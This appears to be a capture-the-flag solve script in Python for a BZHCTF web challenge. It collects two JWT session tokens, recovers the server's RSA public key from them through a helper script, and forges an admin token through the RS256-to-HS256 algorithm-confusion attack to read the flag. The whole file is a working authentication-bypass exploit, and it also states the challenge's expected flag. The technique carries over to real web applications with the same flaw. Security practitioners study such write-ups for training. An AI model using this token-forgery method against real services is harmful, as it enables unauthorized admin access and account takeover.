#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import jwt
import time
import subprocess

URL = "https://jwthe.ctf.bzh/"

s = requests.session()
data = {
    "firstname": "alex",
    "drink": "1",
    "size": "S",
    "toppings": "",
    "note": ""
}

print(f"[+] Generate 2 JWTokens")
s.post(f"{URL}/command", json=data)
t1 = dict(s.cookies)["session"]
time.sleep(2)
s.post(f"{URL}/command", json=data)
t2 = dict(s.cookies)["session"]

print(t1)
print(t2)

print(f"[+] Recovering public key for algorithm RS256... (this may take some time)")
output = subprocess.check_output(f"python3 recover.py {t1} {t2}", shell=True).decode()

assert("Found public RSA key !" in output)

n = int(output.split("n=")[1].split("\n")[0])
public_key = output.split("-----BEGIN PUBLIC KEY-----")[1].split("-----END PUBLIC KEY-----")[0]
public_key = f"-----BEGIN PUBLIC KEY-----{public_key}-----END PUBLIC KEY-----"

with open("public.pem", "w") as f:
    f.write(public_key)
print(public_key)
print(f"n = {n}")

print(f"[+] Signing new admin token with HS256 and public.pem")
token = {
    "firstname": "alex",
    "drink": "1",
    "size": "S",
    "toppings": "",
    "note": "",
    "role": "admin",  # on set le rôle admin ici
    "iat": int(time.time())
}

RSA_PUBLIC = open("public.pem").read()
encoded_jwt = jwt.encode(token, RSA_PUBLIC, algorithm="HS256")

print(f"[+] Query website with new token and get flag")
s.cookies.set("session", None)  # https://stackoverflow.com/questions/25429754/how-to-modify-cookies-in-requests
s.cookies.set("session", encoded_jwt)
r = s.get(f"{URL}/recettes").text
flag = r.split("recettes: ")[1].split(".")[0]
print(f"[+] Flag is: {flag}")
assert(flag == r"BZHCTF{JWThé_à_la_menthe}")
